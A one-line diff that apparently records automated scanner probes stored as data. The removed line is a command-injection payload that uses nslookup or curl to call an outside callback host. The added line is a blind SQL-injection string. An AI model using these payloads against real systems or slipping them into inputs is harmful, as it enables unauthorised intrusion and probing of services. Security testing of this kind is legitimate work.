@@ -1,1 +1,1 @@
-&(nslookup -q=cname hitcbzgoucmlfc3654.bxss.me||curl hitcbzgoucmlfc3654.bxss.me)&'\"`0&(nslookup -q=cname hitcbzgoucmlfc3654.bxss.me||curl hitcbzgoucmlfc3654.bxss.me)&`'
+-1' OR 2+32-32-1=0+0+0+1 -- 
